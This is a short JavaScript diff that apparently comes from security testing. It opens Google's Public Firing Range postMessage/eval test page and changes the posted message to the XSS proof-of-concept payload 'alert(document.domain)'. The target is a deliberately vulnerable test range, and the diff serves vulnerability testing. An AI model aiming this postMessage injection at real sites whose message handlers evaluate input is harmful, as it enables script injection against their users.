@@ -5,6 +5,7 @@
 //)
 
 const target = window.open("https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval");
+
 target.postMessage(
-{"content":"hello target"} , "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval"
+{"content":"alert(document.domain)"} , "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval"
 );
